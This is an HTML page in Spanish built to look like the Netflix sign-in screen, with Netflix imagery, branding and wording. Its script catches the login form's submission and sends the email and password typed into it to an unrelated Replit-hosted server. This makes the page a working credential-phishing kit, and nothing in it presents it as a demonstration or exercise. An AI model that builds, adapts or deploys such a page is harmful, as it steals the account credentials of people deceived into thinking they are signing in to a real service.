<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Iniciar sesión</title>
  
  <!-- Fuente de Netflix (similar a Helvetica Neue) -->
  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet">

  <style> 
    body {
      margin: 0;
      padding: 0;
      background: url('https://images.frandroid.com/wp-content/uploads/2022/10/netflix-octobre-contenus-2022.jpg') center center / cover no-repeat;
      background-color: black; /* fallback */
      font-family: 'Helvetica Neue', sans-serif;
      position: relative;
      min-height: 100vh;
    }

    /* Oscurecer el fondo */
    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background-color: rgba(0, 0, 0, 0.6);
      z-index: 0;
    }

    .login-form { 

      background-color: rgba(17, 17, 17, 0.95);
      max-width: 400px;
      margin: 100px auto;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.75);
      position: relative;
      z-index: 1;
    }

    label { 
      color: #b3b3b3;
      font-size: 14px;
      display: block;
      margin-bottom: 5px;
    }

    .login-input { 
      background-color: #333;
      color: white;
      border: 1px solid #333;
      padding: 10px;
      border-radius: 4px;
      margin-bottom: 15px;
      width: 100%;
    }

    .login-input:focus {
      outline: none;
      border: 1px solid white;
    }

    .login-button {
      background-color: #e50914;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-button:hover {
      background-color: #f40612;
    }

    .extra-options {
      color: #b3b3b3;
      font-size: 13px;
      margin-top: 10px;
    }

    .extra-options a {
      color: white;
      text-decoration: none;
    }

    .extra-options a:hover {
      text-decoration: underline;
    }
    .netflix-logo {
     position: fixed;
     top: 20px;
     left: 30px;
     width: 120px;
     z-index: 10;
}


    @media (max-width: 480px) {
      .login-form { 
        max-width: 90%;
        margin: 50px auto;  
        padding: 20px;
      }
    }
  </style>
</head>

<form id="login-form" action="#" method="post" class="login-form">

  <label for="username">Dirección de correo electrónico</label>
  <input type="text" name="username" placeholder="Dirección de correo electrónico" class="login-input" required>

  <label for="password">Contraseña</label>
  <input type="password" name="password" placeholder="Contraseña" class="login-input" required>

  <div class="extra-options">
    <input type="checkbox" id="remember">
    <label for="remember">Recordarme</label>
    <p><a href="#">¿Has olvidado tu contraseña?</a></p>
    <p>¿Primera vez en Netflix? <a href="#">Suscríbete ya.</a></p>
  </div>

  <button type="submit" class="login-button">Iniciar sesión</button>
</form>

<script>
document.getElementById('login-form').addEventListener('submit', async function(e) {
  e.preventDefault();

const email = e.target.username.value;
const password = e.target.password.value;


  try {
    const response = await fetch('https://24fb22b1-ac17-4147-8b76-b84d03afe8c2-00-14r6zwjdn77nl.riker.replit.dev/datos', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });

    const data = await response.json();
    console.log("Respuesta del servidor:", data);
  } catch (error) {
    console.error("Error al enviar datos:", error);
  }
});
</script>

</body>
</html>
